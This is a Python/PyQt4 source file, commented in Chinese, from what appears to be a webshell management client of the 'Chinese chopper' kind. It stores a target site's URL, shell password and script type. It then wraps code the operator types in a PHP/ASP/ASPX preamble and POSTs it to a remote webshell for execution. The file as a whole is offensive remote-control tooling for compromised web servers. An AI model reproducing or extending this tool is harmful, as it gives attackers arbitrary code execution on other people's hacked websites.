#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#自写脚本
from PyQt4 import uic
from PyQt4 import QtCore, QtGui ,QtNetwork
from PyQt4.QtCore import pyqtSlot
from PyQt4.QtCore import *
from ctypes import *
from PyQt4.QtGui import *
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding("utf-8")

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

from ui import tabWidget_close_lock,UIManager
from Db_Model import db_shell #常用数据库操作
from Clicked_Controller import ip_query #显示IP地址
from Clicked_Controller import link_shell  #链接SHELL等操作
from Clicked_Controller import eval_link  #链接SHELL
from Clicked_Controller import ShowFileManage_class  #文件管理事件响应
from Clicked_Controller import threadpool #线程操作
from Clicked_Controller import log #日志记录
import link_except_ui   #错误异常处理
import ShowWebManage_ui  #WEB浏览
import base64

class Worker_Thread(QThread):
    Finish = pyqtSignal() #basestring
    Finish1 = pyqtSignal(basestring) #
    Finish2 = pyqtSignal(basestring,basestring) #

    def __init__(self,**kwargs):
        super(Worker_Thread,self).__init__()
        if "name" in kwargs:  #名称
            self.name=str((kwargs['name']))
            #print "xxx",self.name
        if "var1" in kwargs:  #变量1
            self.var1=str((kwargs['var1']))
            #print "xxx",self.var1
        if "var2" in kwargs:  #变量2
            self.var2=str((kwargs['var2']))
            #print "xxx",self.var2

    def run(self):
        try:
            if self.name=="uix0":   #无参数
                self.Finish.emit()
                #self.treeWidget.doubleClicked.connect(self.double_click)  #目录查看数据  双击
            if self.name=="uix1":   #1个无参数
                self.Finish1.emit(self.var1)
            if self.name=="uix2":   #2个无参数
                self.Finish2.emit(self.var1,self.var2)
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))
            #print(str(e))

class ShowEdit_shellManage_ui(QWidget):
    def __init__(self,**kwargs):
        super(ShowEdit_shellManage_ui, self).__init__()
        try:
            self.main_ui=UIManager.get_ui('main_ui') #主程序UI
            self.shell_sql=UIManager.shell_sql
            self.ShowEdit_ui = uic.loadUi("ui/ShowEdit_shellManage.ui", self)#动态加标签
            ###########################################
            self.id_shell_list=db_shell.id_sitetable_shell('%s'%(kwargs['ID']))  #通过ID查询SHELL的状态
            self.id=str(self.id_shell_list[0])         #自动编号
            #self.type_id=str(self.id_shell_list[1])    #      类别
            self.siteurl=str(self.id_shell_list[2])    #    网址
            self.sitepass=str(self.id_shell_list[3])   #    密码
            #self.link=str(self.id_shell_list[4])         #链接状态
            #self.ip=str(self.id_shell_list[5])         #    ip地址
            #self.config=str(self.id_shell_list[6])     #    配置
            #self.coding=str(self.id_shell_list[7])     #  编码方式
            self.script=str(self.id_shell_list[8])      #   asp   php
            ###########################################
            name_Title=u"%s"%(ip_query.url_www(str(self.siteurl)))  #_fromUtf8("文件管理-" + str(QTableName))
            self.main_ui.tabWidget.addTab(self.ShowEdit_ui,QIcon('system/file_Edit.ico'),name_Title)
            if "form" in kwargs:  #名称
                if int(kwargs['form']):
                    self.main_ui.tabWidget.setCurrentIndex(self.main_ui.tabWidget.count()-1)#显示当前页

            self.label.setText(self.script)
            if self.script=="PHP":
                #psot_data=link_shell.GetPostText(self.script,"WebRoot")    #获取代码
                psot_data="<?php\r\nphpinfo();\r\n?>"
            if self.script=="ASP":
                #psot_data=link_shell.GetPostText(self.script,"WebRoot")    #获取代码
                psot_data="<%@LANGUAGE = VBScript.Encode%>\r\n<%\r\nResponse.Write(\"Hello ASP!\")\r\n%>"
            if self.script=="ASPX":
                psot_data="Response.Write(\"Hello JScript.NET!\");"
            self.textEdit.setText(str(psot_data))
            ###########################################
            self.send_pushButton.clicked.connect(self.send_Button_Thread)    #执行
            self.null_pushButton.clicked.connect(self.null_Button)    #清空数据
            self.help_Button.clicked.connect(self.help_web)     #获取更多帮助
            ###########################################
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def help_web(self):  #打开网页
        try:
            ShowWebManage_ui.ShowWebManage_ui(Title="http://eval.webxscan.com",form=1)
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def null_Button(self):  #清空数据
        try:
            self.textEdit.setText(str(""))
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def send_Button_Thread(self):  #执行
        try:
            self.work = Worker_Thread(name="uix0")
            self.work.Finish.connect(self.send_Button)
            self.work.start()
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def send_Button(self):  #执行
        try:
            if self.script=="PHP":
                psot_data=self.textEdit.toPlainText()  #获取内容
                psot_data="@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\"->|\");"+ \
                     str(link_shell.php_Handle(str(psot_data)))+"echo(\"|<-\");die();"
                psot_data=link_shell.post_php_data(str(psot_data))
            if self.script=="ASP":
                psot_data=self.textEdit.toPlainText()  #获取内容
                psot_data=str(link_shell.asp_Handle(str(psot_data)))
            if self.script=="ASPX":
                psot_data=self.textEdit.toPlainText()  #获取内容
                psot_data=str(link_shell.aspx_Handle(str(psot_data)))
            FALSE_bool,ResInfo=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
            self.messages.setText(str(ResInfo))
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))












